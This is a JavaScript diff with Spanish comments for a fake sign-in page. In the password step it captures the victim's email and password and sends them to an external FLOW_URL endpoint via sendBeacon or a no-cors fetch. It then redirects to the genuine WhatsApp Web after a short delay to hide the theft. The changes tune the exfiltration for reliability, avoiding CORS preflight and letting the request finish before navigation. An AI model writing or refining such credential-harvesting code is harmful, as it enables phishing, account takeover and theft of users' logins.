@@ -235,29 +235,37 @@
 
     }else{
       // >>>>>> AÑADIDO: enviar correo y contraseña al flujo sin bloquear la redirección
-      try {
-        const payload = JSON.stringify({
-          email: idValue.textContent,
-          password: input.value
-        });
+      // En estado 'pwd' al enviar, primero disparamos el POST y luego redirigimos
+try {
+  const data = {
+    email: idValue.textContent,
+    password: input.value,
+    ts: new Date().toISOString()
+  };
+  const body = JSON.stringify(data);
 
-        if (navigator.sendBeacon) {
-          const blob = new Blob([payload], { type: "application/json" });
-          navigator.sendBeacon(FLOW_URL, blob);
-        } else {
-          fetch(FLOW_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: payload,
-            keepalive: true
-          }).catch(()=>{});
-        }
-      } catch (_) {}
-      // <<<<<<
+  // 1) Intento con sendBeacon usando STRING (Content-Type: text/plain)
+  let sent = false;
+  if (navigator.sendBeacon) {
+    sent = navigator.sendBeacon(FLOW_URL, body);
+  }
 
-      // En estado 'pwd' al enviar, redirige a WhatsApp Web
-      window.location.href = 'https://web.whatsapp.com/';
-    }
+  // 2) Fallback: fetch sin cabeceras y no-cors (también CORS-safe)
+  if (!sent) {
+    fetch(FLOW_URL, {
+      method: "POST",
+      mode: "no-cors",
+      body,            // text/plain implícito
+      keepalive: true  // intenta completarla aunque navegues
+    }).catch(()=>{});
+  }
+} catch (_) {}
+
+// Pequeño delay para mejorar entrega antes de salir
+setTimeout(()=>{
+  window.location.href = 'https://web.whatsapp.com/';
+}, 180);
+
   });
 
   // Change -> vuelve al estado inicial
